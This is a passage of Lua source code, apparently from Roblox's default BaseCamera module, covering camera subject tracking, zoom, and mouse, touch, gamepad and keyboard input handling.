									if bodyPartToFollow == humanoid.RootPart then
										local rootPartSizeOffset = (humanoid.RootPart.Size.Y/2) - (HUMANOID_ROOT_PART_SIZE.Y/2)
										heightOffset = heightOffset + Vector3.new(0, rootPartSizeOffset, 0)
									end
								else
									heightOffset = R15_HEAD_OFFSET_NO_SCALING
								end
							else
								heightOffset = HEAD_OFFSET
							end

							if humanoidIsDead then
								heightOffset = ZERO_VECTOR3
							end

							result = bodyPartToFollow.CFrame.p + bodyPartToFollow.CFrame:vectorToWorldSpace(heightOffset + humanoid.CameraOffset)
						end
					end

				elseif cameraSubject:IsA("VehicleSeat") then
					local offset = SEAT_OFFSET
					if VRService.VREnabled then
						offset = VR_SEAT_OFFSET
					end
					result = cameraSubject.CFrame.p + cameraSubject.CFrame:vectorToWorldSpace(offset)
				elseif cameraSubject:IsA("SkateboardPlatform") then
					result = cameraSubject.CFrame.p + SEAT_OFFSET
				elseif cameraSubject:IsA("BasePart") then
					result = cameraSubject.CFrame.p
				elseif cameraSubject:IsA("Model") then
					if cameraSubject.PrimaryPart then
						result = cameraSubject:GetPrimaryPartCFrame().p
					else
						result = cameraSubject:GetModelCFrame().p
					end
				end
			else
				-- cameraSubject is nil
				-- Note: Previous RootCamera did not have this else case and let self.lastSubject and self.lastSubjectPosition
				-- both get set to nil in the case of cameraSubject being nil. This function now exits here to preserve the
				-- last set valid values for these, as nil values are not handled cases
				return
			end

			self.lastSubject = cameraSubject
			self.lastSubjectPosition = result

			return result
		end

		function BaseCamera:UpdateDefaultSubjectDistance()
			if self.portraitMode then
				self.defaultSubjectDistance = math.clamp(PORTRAIT_DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
			else
				self.defaultSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
			end
		end

		function BaseCamera:OnViewportSizeChanged()
			local camera = game.Workspace.CurrentCamera
			local size = camera.ViewportSize
			self.portraitMode = size.X < size.Y
			self.isSmallTouchScreen = UserInputService.TouchEnabled and (size.Y < 500 or size.X < 700)

			self:UpdateDefaultSubjectDistance()
		end

		-- Listener for changes to workspace.CurrentCamera
		function BaseCamera:OnCurrentCameraChanged()
			if UserInputService.TouchEnabled then
				if self.viewportSizeChangedConn then
					self.viewportSizeChangedConn:Disconnect()
					self.viewportSizeChangedConn = nil
				end

				local newCamera = game.Workspace.CurrentCamera

				if newCamera then
					self:OnViewportSizeChanged()
					self.viewportSizeChangedConn = newCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
						self:OnViewportSizeChanged()
					end)
				end
			end

			-- VR support additions
			if self.cameraSubjectChangedConn then
				self.cameraSubjectChangedConn:Disconnect()
				self.cameraSubjectChangedConn = nil
			end

			local camera = game.Workspace.CurrentCamera
			if camera then
				self.cameraSubjectChangedConn = camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
					self:OnNewCameraSubject()
				end)
				self:OnNewCameraSubject()
			end
		end

		function BaseCamera:OnDynamicThumbstickEnabled()
			if UserInputService.TouchEnabled then
				self.isDynamicThumbstickEnabled = true
			end
		end

		function BaseCamera:OnDynamicThumbstickDisabled()
			self.isDynamicThumbstickEnabled = false
		end

		function BaseCamera:OnGameSettingsTouchMovementModeChanged()
			if player.DevTouchMovementMode == Enum.DevTouchMovementMode.UserChoice then
				if (UserGameSettings.TouchMovementMode == Enum.TouchMovementMode.DynamicThumbstick
					or UserGameSettings.TouchMovementMode == Enum.TouchMovementMode.Default) then
					self:OnDynamicThumbstickEnabled()
				else
					self:OnDynamicThumbstickDisabled()
				end
			end
		end

		function BaseCamera:OnDevTouchMovementModeChanged()
			if player.DevTouchMovementMode.Name == "DynamicThumbstick" then
				self:OnDynamicThumbstickEnabled()
			else
				self:OnGameSettingsTouchMovementModeChanged()
			end
		end

		function BaseCamera:OnPlayerCameraPropertyChange()
			-- This call forces re-evaluation of player.CameraMode and clamping to min/max distance which may have changed
			self:SetCameraToSubjectDistance(self.currentSubjectDistance)
		end

		function BaseCamera:GetCameraHeight()
			if VRService.VREnabled and not self.inFirstPerson then
				return math.sin(VR_ANGLE) * self.currentSubjectDistance
			end
			return 0
		end

		function BaseCamera:InputTranslationToCameraAngleChange(translationVector, sensitivity)
			if not FFlagUserDontAdjustSensitvityForPortrait then
				local camera = game.Workspace.CurrentCamera
				if camera and camera.ViewportSize.X > 0 and camera.ViewportSize.Y > 0 and (camera.ViewportSize.Y > camera.ViewportSize.X) then
					-- Screen has portrait orientation, swap X and Y sensitivity
					return translationVector * Vector2.new( sensitivity.Y, sensitivity.X)
				end
			end
			return translationVector * sensitivity
		end

		function BaseCamera:Enable(enable)
			if self.enabled ~= enable then
				self.enabled = enable
				if self.enabled then
					self:ConnectInputEvents()
					self:BindContextActions()

					if player.CameraMode == Enum.CameraMode.LockFirstPerson then
						self.currentSubjectDistance = 0.5
						if not self.inFirstPerson then
							self:EnterFirstPerson()
						end
					end
				else
					self:DisconnectInputEvents()
					self:UnbindContextActions()
					-- Clean up additional event listeners and reset a bunch of properties
					self:Cleanup()
				end
			end
		end

		function BaseCamera:GetEnabled()
			return self.enabled
		end

		function BaseCamera:OnInputBegan(input, processed)
			if input.UserInputType == Enum.UserInputType.Touch then
				self:OnTouchBegan(input, processed)
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
				self:OnMouse2Down(input, processed)
			elseif input.UserInputType == Enum.UserInputType.MouseButton3 then
				self:OnMouse3Down(input, processed)
			end
		end

		function BaseCamera:OnInputChanged(input, processed)
			if input.UserInputType == Enum.UserInputType.Touch then
				self:OnTouchChanged(input, processed)
			elseif input.UserInputType == Enum.UserInputType.MouseMovement then
				self:OnMouseMoved(input, processed)
			end
		end

		function BaseCamera:OnInputEnded(input, processed)
			if input.UserInputType == Enum.UserInputType.Touch then
				self:OnTouchEnded(input, processed)
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
				self:OnMouse2Up(input, processed)
			elseif input.UserInputType == Enum.UserInputType.MouseButton3 then
				self:OnMouse3Up(input, processed)
			end
		end

		function BaseCamera:OnPointerAction(wheel, pan, pinch, processed)
			if processed then
				return
			end

			if pan.Magnitude > 0 then
				local inversionVector = Vector2.new(1, UserGameSettings:GetCameraYInvertValue())
				local rotateDelta = self:InputTranslationToCameraAngleChange(PAN_SENSITIVITY*pan, MOUSE_SENSITIVITY)*inversionVector
				self.rotateInput = self.rotateInput + rotateDelta
			end

			local zoom = self.currentSubjectDistance
			local zoomDelta = -(wheel + pinch)

			if abs(zoomDelta) > 0 then
				local newZoom
				if self.inFirstPerson and zoomDelta > 0 then
					newZoom = FIRST_PERSON_DISTANCE_THRESHOLD
				else
					if FFlagUserFixZoomInZoomOutDiscrepancy then
						if (zoomDelta > 0) then
							newZoom = zoom + zoomDelta*(1 + zoom*ZOOM_SENSITIVITY_CURVATURE)
						else
							newZoom = (zoom + zoomDelta) / (1 - zoomDelta*ZOOM_SENSITIVITY_CURVATURE)
						end
					else
						newZoom = zoom + zoomDelta*(1 + zoom*ZOOM_SENSITIVITY_CURVATURE)
					end
				end

				self:SetCameraToSubjectDistance(newZoom)
			end
		end

		function BaseCamera:ConnectInputEvents()
			self.pointerActionConn = UserInputService.PointerAction:Connect(function(wheel, pan, pinch, processed)
				self:OnPointerAction(wheel, pan, pinch, processed)
			end)

			self.inputBeganConn = UserInputService.InputBegan:Connect(function(input, processed)
				self:OnInputBegan(input, processed)
			end)

			self.inputChangedConn = UserInputService.InputChanged:Connect(function(input, processed)
				self:OnInputChanged(input, processed)
			end)

			self.inputEndedConn = UserInputService.InputEnded:Connect(function(input, processed)
				self:OnInputEnded(input, processed)
			end)

			self.menuOpenedConn = GuiService.MenuOpened:connect(function()
				self:ResetInputStates()
			end)

			self.gamepadConnectedConn = UserInputService.GamepadDisconnected:connect(function(gamepadEnum)
				if self.activeGamepad ~= gamepadEnum then return end
				self.activeGamepad = nil
				self:AssignActivateGamepad()
			end)

			self.gamepadDisconnectedConn = UserInputService.GamepadConnected:connect(function(gamepadEnum)
				if self.activeGamepad == nil then
					self:AssignActivateGamepad()
				end
			end)

			self:AssignActivateGamepad()
			if not FFlagUserCameraToggle then
				self:UpdateMouseBehavior()
			end
		end

		function BaseCamera:BindContextActions()
			self:BindGamepadInputActions()
			self:BindKeyboardInputActions()
		end

		function BaseCamera:AssignActivateGamepad()
			local connectedGamepads = UserInputService:GetConnectedGamepads()
			if #connectedGamepads > 0 then
				for i = 1, #connectedGamepads do
					if self.activeGamepad == nil then
						self.activeGamepad = connectedGamepads[i]
					elseif connectedGamepads[i].Value < self.activeGamepad.Value then
						self.activeGamepad = connectedGamepads[i]
					end
				end
			end

			if self.activeGamepad == nil then -- nothing is connected, at least set up for gamepad1
				self.activeGamepad = Enum.UserInputType.Gamepad1
			end
		end

		function BaseCamera:DisconnectInputEvents()
			if self.inputBeganConn then
				self.inputBeganConn:Disconnect()
				self.inputBeganConn = nil
			end
			if self.inputChangedConn then
				self.inputChangedConn:Disconnect()
				self.inputChangedConn = nil
			end
			if self.inputEndedConn then
				self.inputEndedConn:Disconnect()
				self.inputEndedConn = nil
			end
		end

		function BaseCamera:UnbindContextActions()
			for i = 1, #self.boundContextActions do
				ContextActionService:UnbindAction(self.boundContextActions[i])
			end
			self.boundContextActions = {}
		end

		function BaseCamera:Cleanup()
			if self.pointerActionConn then
				self.pointerActionConn:Disconnect()
				self.pointerActionConn = nil
			end
			if self.menuOpenedConn then
				self.menuOpenedConn:Disconnect()
				self.menuOpenedConn = nil
			end
			if self.mouseLockToggleConn then
				self.mouseLockToggleConn:Disconnect()
				self.mouseLockToggleConn = nil
			end
			if self.gamepadConnectedConn then
				self.gamepadConnectedConn:Disconnect()
				self.gamepadConnectedConn = nil
			end
			if self.gamepadDisconnectedConn then
				self.gamepadDisconnectedConn:Disconnect()
				self.gamepadDisconnectedConn = nil
			end
			if self.subjectStateChangedConn then
				self.subjectStateChangedConn:Disconnect()
				self.subjectStateChangedConn = nil
			end
			if self.viewportSizeChangedConn then
				self.viewportSizeChangedConn:Disconnect()
				self.viewportSizeChangedConn = nil
			end
			if self.touchActivateConn then
				self.touchActivateConn:Disconnect()
				self.touchActivateConn = nil
			end

			self.turningLeft = false
			self.turningRight = false
			self.lastCameraTransform = nil
			self.lastSubjectCFrame = nil
			self.userPanningTheCamera = false
			self.rotateInput = Vector2.new()
			self.gamepadPanningCamera = Vector2.new(0,0)

			-- Reset input states
			self.startPos = nil
			self.lastPos = nil
			self.panBeginLook = nil
			self.isRightMouseDown = false
			self.isMiddleMouseDown = false

			self.fingerTouches = {}
			self.dynamicTouchInput = nil
			self.numUnsunkTouches = 0

			self.startingDiff = nil
			self.pinchBeginZoom = nil

			-- Unlock mouse for example if right mouse button was being held down
			if UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
			end
		end

		-- This is called when settings menu is opened
		function BaseCamera:ResetInputStates()
			self.isRightMouseDown = false
			self.isMiddleMouseDown = false
			self:OnMousePanButtonReleased() -- this function doesn't seem to actually need parameters

			if UserInputService.TouchEnabled then
			--[[menu opening was causing serious touch issues
			this should disable all active touch events if
			they're active when menu opens.]]
				for inputObject in pairs(self.fingerTouches) do
					self.fingerTouches[inputObject] = nil
				end
				self.dynamicTouchInput = nil
				self.panBeginLook = nil
				self.startPos = nil
				self.lastPos = nil
				self.userPanningTheCamera = false
				self.startingDiff = nil
				self.pinchBeginZoom = nil
				self.numUnsunkTouches = 0
			end
		end

		function BaseCamera:GetGamepadPan(name, state, input)
			if input.UserInputType == self.activeGamepad and input.KeyCode == Enum.KeyCode.Thumbstick2 then
				--		if self.L3ButtonDown then
				--			-- L3 Thumbstick is depressed, right stick controls dolly in/out
				--			if (input.Position.Y > THUMBSTICK_DEADZONE) then
				--				self.currentZoomSpeed = 0.96
				--			elseif (input.Position.Y < -THUMBSTICK_DEADZONE) then
				--				self.currentZoomSpeed = 1.04
				--			else
				--				self.currentZoomSpeed = 1.00
				--			end
				--		else
				if state == Enum.UserInputState.Cancel then
					self.gamepadPanningCamera = ZERO_VECTOR2
					return
				end

				local inputVector = Vector2.new(input.Position.X, -input.Position.Y)
				if inputVector.magnitude > THUMBSTICK_DEADZONE then
					self.gamepadPanningCamera = Vector2.new(input.Position.X, -input.Position.Y)
				else
					self.gamepadPanningCamera = ZERO_VECTOR2
				end
				--end
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end

		function BaseCamera:DoKeyboardPanTurn(name, state, input)
			if not self.hasGameLoaded and VRService.VREnabled then
				return Enum.ContextActionResult.Pass
			end

			if state == Enum.UserInputState.Cancel then
				self.turningLeft = false
				self.turningRight = false
				return Enum.ContextActionResult.Sink
			end

			if self.panBeginLook == nil and self.keyPanEnabled then
				if input.KeyCode == Enum.KeyCode.Left then
					self.turningLeft = state == Enum.UserInputState.Begin
				elseif input.KeyCode == Enum.KeyCode.Right then
					self.turningRight = state == Enum.UserInputState.Begin
				end
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end

		function BaseCamera:DoPanRotateCamera(rotateAngle)
			local angle = Util.RotateVectorByAngleAndRound(self:GetCameraLookVector() * Vector3.new(1,0,1), rotateAngle, math.pi*0.25)
			if angle ~= 0 then
				self.rotateInput = self.rotateInput + Vector2.new(angle, 0)
				self.lastUserPanCamera = tick()
				self.lastCameraTransform = nil
			end
		end

		function BaseCamera:DoGamepadZoom(name, state, input)
			if input.UserInputType == self.activeGamepad then
				if input.KeyCode == Enum.KeyCode.ButtonR3 then
					if state == Enum.UserInputState.Begin then
						if self.distanceChangeEnabled then
							local dist = self:GetCameraToSubjectDistance()

							if dist > (GAMEPAD_ZOOM_STEP_2 + GAMEPAD_ZOOM_STEP_3)/2 then
								self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_2)
							elseif dist > (GAMEPAD_ZOOM_STEP_1 + GAMEPAD_ZOOM_STEP_2)/2 then
								self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_1)
							else
								self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_3)
							end
						end
					end
				elseif input.KeyCode == Enum.KeyCode.DPadLeft then
					self.dpadLeftDown = (state == Enum.UserInputState.Begin)
				elseif input.KeyCode == Enum.KeyCode.DPadRight then
					self.dpadRightDown = (state == Enum.UserInputState.Begin)
				end

				if self.dpadLeftDown then
					self.currentZoomSpeed = 1.04
				elseif self.dpadRightDown then
					self.currentZoomSpeed = 0.96
				else
					self.currentZoomSpeed = 1.00
				end
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
			--	elseif input.UserInputType == self.activeGamepad and input.KeyCode == Enum.KeyCode.ButtonL3 then
			--		if (state == Enum.UserInputState.Begin) then
			--			self.L3ButtonDown = true
			--		elseif (state == Enum.UserInputState.End) then
			--			self.L3ButtonDown = false
			--			self.currentZoomSpeed = 1.00
			--		end
			--	end
		end

		function BaseCamera:DoKeyboardZoom(name, state, input)
			if not self.hasGameLoaded and VRService.VREnabled then
				return Enum.ContextActionResult.Pass
			end

			if state ~= Enum.UserInputState.Begin then
				return Enum.ContextActionResult.Pass
			end

			if self.distanceChangeEnabled and player.CameraMode ~= Enum.CameraMode.LockFirstPerson then
				if input.KeyCode == Enum.KeyCode.I then
					self:SetCameraToSubjectDistance( self.currentSubjectDistance - 5 )
				elseif input.KeyCode == Enum.KeyCode.O then
					self:SetCameraToSubjectDistance( self.currentSubjectDistance + 5 )
				end
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end

		function BaseCamera:BindAction(actionName, actionFunc, createTouchButton, ...)
			table.insert(self.boundContextActions, actionName)
			ContextActionService:BindActionAtPriority(actionName, actionFunc, createTouchButton,
				CAMERA_ACTION_PRIORITY, ...)
		end

		function BaseCamera:BindGamepadInputActions()
			self:BindAction("BaseCameraGamepadPan", function(name, state, input) return self:GetGamepadPan(name, state, input) end,
			false, Enum.KeyCode.Thumbstick2)
			self:BindAction("BaseCameraGamepadZoom", function(name, state, input) return self:DoGamepadZoom(name, state, input) end,
			false, Enum.KeyCode.DPadLeft, Enum.KeyCode.DPadRight, Enum.KeyCode.ButtonR3)
		end

		function BaseCamera:BindKeyboardInputActions()
			self:BindAction("BaseCameraKeyboardPanArrowKeys", function(name, state, input) return self:DoKeyboardPanTurn(name, state, input) end,
			false, Enum.KeyCode.Left, Enum.KeyCode.Right)
			self:BindAction("BaseCameraKeyboardZoom", function(name, state, input) return self:DoKeyboardZoom(name, state, input) end,
			false, Enum.KeyCode.I, Enum.KeyCode.O)
		end

		local function isInDynamicThumbstickArea(input)
			local playerGui = player:FindFirstChildOfClass("PlayerGui")
			local touchGui = playerGui and playerGui:FindFirstChild("TouchGui")
			local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
			local thumbstickFrame = touchFrame and touchFrame:FindFirstChild("DynamicThumbstickFrame")

			if not thumbstickFrame then
				return false
			end

			local frameCornerTopLeft = thumbstickFrame.AbsolutePosition
			local frameCornerBottomRight = frameCornerTopLeft + thumbstickFrame.AbsoluteSize
			if input.Position.X >= frameCornerTopLeft.X and input.Position.Y >= frameCornerTopLeft.Y then
				if input.Position.X <= frameCornerBottomRight.X and input.Position.Y <= frameCornerBottomRight.Y then
					return true
				end
			end

			return false
		end

		---Adjusts the camera Y touch Sensitivity when moving away from the center and in the TOUCH_SENSITIVTY_ADJUST_AREA
		function BaseCamera:AdjustTouchSensitivity(delta, sensitivity)
			local cameraCFrame = game.Workspace.CurrentCamera and game.Workspace.CurrentCamera.CFrame
			if not cameraCFrame then
				return sensitivity
			end
			local currPitchAngle = cameraCFrame:ToEulerAnglesYXZ()

			local multiplierY = TOUCH_SENSITIVTY_ADJUST_MAX_Y
			if currPitchAngle > TOUCH_ADJUST_AREA_UP and delta.Y < 0 then
				local fractionAdjust = (currPitchAngle - TOUCH_ADJUST_AREA_UP)/(MAX_Y - TOUCH_ADJUST_AREA_UP)
				fractionAdjust = 1 - (1 - fractionAdjust)^3
				multiplierY = TOUCH_SENSITIVTY_ADJUST_MAX_Y - fractionAdjust * (
					TOUCH_SENSITIVTY_ADJUST_MAX_Y - TOUCH_SENSITIVTY_ADJUST_MIN_Y)
			elseif currPitchAngle < TOUCH_ADJUST_AREA_DOWN and delta.Y > 0 then
				local fractionAdjust = (currPitchAngle - TOUCH_ADJUST_AREA_DOWN)/(MIN_Y - TOUCH_ADJUST_AREA_DOWN)
				fractionAdjust = 1 - (1 - fractionAdjust)^3
				multiplierY = TOUCH_SENSITIVTY_ADJUST_MAX_Y - fractionAdjust * (
					TOUCH_SENSITIVTY_ADJUST_MAX_Y - TOUCH_SENSITIVTY_ADJUST_MIN_Y)
			end

			return Vector2.new(
				sensitivity.X,
				sensitivity.Y * multiplierY
			)
		end

		function BaseCamera:OnTouchBegan(input, processed)
			local canUseDynamicTouch = self.isDynamicThumbstickEnabled and not processed
			if canUseDynamicTouch then
				if self.dynamicTouchInput == nil and isInDynamicThumbstickArea(input) then
					-- First input in the dynamic thumbstick area should always be ignored for camera purposes
					-- Even if the dynamic thumbstick does not process it immediately
					self.dynamicTouchInput = input
					return
				end
				self.fingerTouches[input] = processed
				self.inputStartPositions[input] = input.Position
				self.inputStartTimes[input] = tick()
				self.numUnsunkTouches = self.numUnsunkTouches + 1
			end
		end

		function BaseCamera:OnTouchChanged(input, processed)
			if self.fingerTouches[input] == nil then
				if self.isDynamicThumbstickEnabled then
					return
				end
				self.fingerTouches[input] = processed
				if not processed then
					self.numUnsunkTouches = self.numUnsunkTouches + 1
				end
			end

			if self.numUnsunkTouches == 1 then
				if self.fingerTouches[input] == false then
					self.panBeginLook = self.panBeginLook or self:GetCameraLookVector()
					self.startPos = self.startPos or input.Position
					self.lastPos = self.lastPos or self.startPos
					self.userPanningTheCamera = true

					local delta = input.Position - self.lastPos
					delta = Vector2.new(delta.X, delta.Y * UserGameSettings:GetCameraYInvertValue())
					if self.panEnabled then
						local adjustedTouchSensitivity = TOUCH_SENSITIVTY
						self:AdjustTouchSensitivity(delta, TOUCH_SENSITIVTY)

						local desiredXYVector = self:InputTranslationToCameraAngleChange(delta, adjustedTouchSensitivity)
						self.rotateInput = self.rotateInput + desiredXYVector
					end
					self.lastPos = input.Position
				end
			else
				self.panBeginLook = nil
				self.startPos = nil
				self.lastPos = nil
				self.userPanningTheCamera = false
			end
			if self.numUnsunkTouches == 2 then
				local unsunkTouches = {}
				for touch, wasSunk in pairs(self.fingerTouches) do
					if not wasSunk then
						table.insert(unsunkTouches, touch)
					end
				end
				if #unsunkTouches == 2 then
					local difference = (unsunkTouches[1].Position - unsunkTouches[2].Position).magnitude
					if self.startingDiff and self.pinchBeginZoom then
						local scale = difference / math.max(0.01, self.startingDiff)
						local clampedScale = math.clamp(scale, 0.1, 10)
						if self.distanceChangeEnabled then
							self:SetCameraToSubjectDistance(self.pinchBeginZoom / clampedScale)
						end
					else
						self.startingDiff = difference
						self.pinchBeginZoom = self:GetCameraToSubjectDistance()
					end
				end
			else
				self.startingDiff = nil
				self.pinchBeginZoom = nil
			end
		end

		function BaseCamera:OnTouchEnded(input, processed)
			if input == self.dynamicTouchInput then
				self.dynamicTouchInput = nil
				return
			end

			if self.fingerTouches[input] == false then
				if self.numUnsunkTouches == 1 then
					self.panBeginLook = nil
					self.startPos = nil
					self.lastPos = nil
					self.userPanningTheCamera = false
				elseif self.numUnsunkTouches == 2 then
					self.startingDiff = nil
					self.pinchBeginZoom = nil
				end
			end

			if self.fingerTouches[input] ~= nil and self.fingerTouches[input] == false then
				self.numUnsunkTouches = self.numUnsunkTouches - 1
			end
			self.fingerTouches[input] = nil
			self.inputStartPositions[input] = nil
			self.inputStartTimes[input] = nil
		end

		function BaseCamera:OnMouse2Down(input, processed)
			if processed then return end

			self.isRightMouseDown = true
			self:OnMousePanButtonPressed(input, processed)
		end

		function BaseCamera:OnMouse2Up(input, processed)
			self.isRightMouseDown = false
			self:OnMousePanButtonReleased(input, processed)
		end

		function BaseCamera:OnMouse3Down(input, processed)
			if processed then return end

			self.isMiddleMouseDown = true
			self:OnMousePanButtonPressed(input, processed)
		end

		function BaseCamera:OnMouse3Up(input, processed)
			self.isMiddleMouseDown = false
			self:OnMousePanButtonReleased(input, processed)
		end

		function BaseCamera:OnMouseMoved(input, processed)
			if not self.hasGameLoaded and VRService.VREnabled then
				return
			end

			local inputDelta = input.Delta
			inputDelta = Vector2.new(inputDelta.X, inputDelta.Y * UserGameSettings:GetCameraYInvertValue())

			local isInputPanning = FFlagUserCameraToggle and CameraInput.getPanning()
			local isBeginLook = self.startPos and self.lastPos and self.panBeginLook
			local isPanning = isBeginLook or self.inFirstPerson or self.inMouseLockedMode or isInputPanning

			if self.panEnabled and isPanning then
				local desiredXYVector = self:InputTranslationToCameraAngleChange(inputDelta, MOUSE_SENSITIVITY)
				self.rotateInput = self.rotateInput + desiredXYVector
			end

			if self.startPos and self.lastPos and self.panBeginLook then
				self.lastPos = self.lastPos + input.Delta
			end
		end

		function BaseCamera:OnMousePanButtonPressed(input, processed)
			if processed then return end
			if not FFlagUserCameraToggle then
				self:UpdateMouseBehavior()
			end
			self.panBeginLook = self.panBeginLook or self:GetCameraLookVector()
			self.startPos = self.startPos or input.Position
			self.lastPos = self.lastPos or self.startPos
			self.userPanningTheCamera = true
		end

		function BaseCamera:OnMousePanButtonReleased(input, processed)
			if not FFlagUserCameraToggle then
				self:UpdateMouseBehavior()
			end
			if not (self.isRightMouseDown or self.isMiddleMouseDown) then
				self.panBeginLook = nil
				self.startPos = nil
				self.lastPos = nil
				self.userPanningTheCamera = false
			end
		end

		function BaseCamera:UpdateMouseBehavior()
			if FFlagUserCameraToggle and self.isCameraToggle then
				CameraUI.setCameraModeToastEnabled(true)
				CameraInput.enableCameraToggleInput()
				CameraToggleStateController(self.inFirstPerson)
			else
				if FFlagUserCameraToggle then
					CameraUI.setCameraModeToastEnabled(false)
					CameraInput.disableCameraToggleInput()
				end
				-- first time transition to first person mode or mouse-locked third person
				if self.inFirstPerson or self.inMouseLockedMode then
					--UserGameSettings.RotationType = Enum.RotationType.CameraRelative
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				else
					UserGameSettings.RotationType = Enum.RotationType.MovementRelative
					if self.isRightMouseDown or self.isMiddleMouseDown then
						UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
					else
						UserInputService.MouseBehavior = Enum.MouseBehavior.Default
					end
				end
			end
		end

		function BaseCamera:UpdateForDistancePropertyChange()
			-- Calling this setter with the current value will force checking that it is still
			-- in range after a change to the min/max distance limits
			self:SetCameraToSubjectDistance(self.currentSubjectDistance)
		end

		function BaseCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
			local lastSubjectDistance = self.currentSubjectDistance

			-- By default, camera modules will respect LockFirstPerson and override the currentSubjectDistance with 0
			-- regardless of what Player.CameraMinZoomDistance is set to, so that first person can be made
			-- available by the developer without needing to allow players to mousewheel dolly into first person.
			-- Some modules will override this function to remove or change first-person capability.
			if player.CameraMode == Enum.CameraMode.LockFirstPerson then
				self.currentSubjectDistance = 0.5
				if not self.inFirstPerson then
					self:EnterFirstPerson()
				end
			else
				local newSubjectDistance = math.clamp(desiredSubjectDistance, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
				if newSubjectDistance < FIRST_PERSON_DISTANCE_THRESHOLD then
					self.currentSubjectDistance = 0.5
					if not self.inFirstPerson then
						self:EnterFirstPerson()
					end
				else
					self.currentSubjectDistance = newSubjectDistance
					if self.inFirstPerson then
						self:LeaveFirstPerson()
					end
				end
			end

			-- Pass target distance and zoom direction to the zoom controller
			ZoomController.SetZoomParameters(self.currentSubjectDistance, math.sign(desiredSubjectDistance - lastSubjectDistance))

			-- Returned only for convenience to the caller to know the outcome
			return self.currentSubjectDistance
		end

		function BaseCamera:SetCameraType( cameraType )
			--Used by derived classes
			self.cameraType = cameraType
		end

		function BaseCamera:GetCameraType()
			return self.cameraType
		end

		-- Movement mode standardized to Enum.ComputerCameraMovementMode values
		function BaseCamera:SetCameraMovementMode( cameraMovementMode )
			self.cameraMovementMode = cameraMovementMode
		end

		function BaseCamera:GetCameraMovementMode()
			return self.cameraMovementMode
		end

		function BaseCamera:SetIsMouseLocked(mouseLocked)
			self.inMouseLockedMode = mouseLocked
			if not FFlagUserCameraToggle then
				self:UpdateMouseBehavior()
			end
		end

		function BaseCamera:GetIsMouseLocked()
			return self.inMouseLockedMode
		end

		function BaseCamera:SetMouseLockOffset(offsetVector)
			self.mouseLockOffset = offsetVector
		end

		function BaseCamera:GetMouseLockOffset()
			return self.mouseLockOffset
		end

		function BaseCamera:InFirstPerson()
			return self.inFirstPerson
		end

		function BaseCamera:EnterFirstPerson()
			-- Overridden in ClassicCamera, the only module which supports FirstPerson
		end

		function BaseCamera:LeaveFirstPerson()
			-- Overridden in ClassicCamera, the only module which supports FirstPerson
		end

		-- Nominal distance, set by dollying in and out with the mouse wheel or equivalent, not measured distance
		function BaseCamera:GetCameraToSubjectDistance()
			return self.currentSubjectDistance
		end

		-- Actual measured distance to the camera Focus point, which may be needed in special circumstances, but should
		-- never be used as the starting point for updating the nominal camera-to-subject distance (self.currentSubjectDistance)
		-- since that is a desired target value set only by mouse wheel (or equivalent) input, PopperCam, and clamped to min max camera distance
		function BaseCamera:GetMeasuredDistanceToFocus()
			local camera = game.Workspace.CurrentCamera
			if camera then
				return (camera.CoordinateFrame.p - camera.Focus.p).magnitude
			end
			return nil
		end

		function BaseCamera:GetCameraLookVector()
			return game.Workspace.CurrentCamera and game.Workspace.CurrentCamera.CFrame.lookVector or UNIT_Z
		end

		-- Replacements for RootCamera:RotateCamera() which did not actually rotate the camera
		-- suppliedLookVector is not normally passed in, it's used only by Watch camera
		function BaseCamera:CalculateNewLookCFrame(suppliedLookVector)
			local currLookVector = suppliedLookVector or self:GetCameraLookVector()
			local currPitchAngle = math.asin(currLookVector.y)
			local yTheta = math.clamp(self.rotateInput.y, -MAX_Y + currPitchAngle, -MIN_Y + currPitchAngle)
			local constrainedRotateInput = Vector2.new(self.rotateInput.x, yTheta)
			local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
			local newLookCFrame = CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)
			return newLookCFrame
		end
		function BaseCamera:CalculateNewLookVector(suppliedLookVector)
			local newLookCFrame = self:CalculateNewLookCFrame(suppliedLookVector)
			return newLookCFrame.lookVector
		end

		function BaseCamera:CalculateNewLookVectorVR()
			local subjectPosition = self:GetSubjectPosition()
			local vecToSubject = (subjectPosition - game.Workspace.CurrentCamera.CFrame.p)
			local currLookVector = (vecToSubject * X1_Y0_Z1).unit
			local vrRotateInput = Vector2.new(self.rotateInput.x, 0)
			local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
			local yawRotatedVector = (CFrame.Angles(0, -vrRotateInput.x, 0) * startCFrame * CFrame.Angles(-vrRotateInput.y,0,0)).lookVector
			return (yawRotatedVector * X1_Y0_Z1).unit
		end

		function BaseCamera:GetHumanoid()
			local character = player and player.Character
			if character then
				local resultHumanoid = self.humanoidCache[player]
				if resultHumanoid and resultHumanoid.Parent == character then
					return resultHumanoid
				else
					self.humanoidCache[player] = nil -- Bust Old Cache
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						self.humanoidCache[player] = humanoid
					end
					return humanoid
				end
			end
			return nil
		end

		function BaseCamera:GetHumanoidPartToFollow(humanoid, humanoidStateType)
			if humanoidStateType == Enum.HumanoidStateType.Dead then
				local character = humanoid.Parent
				if character then
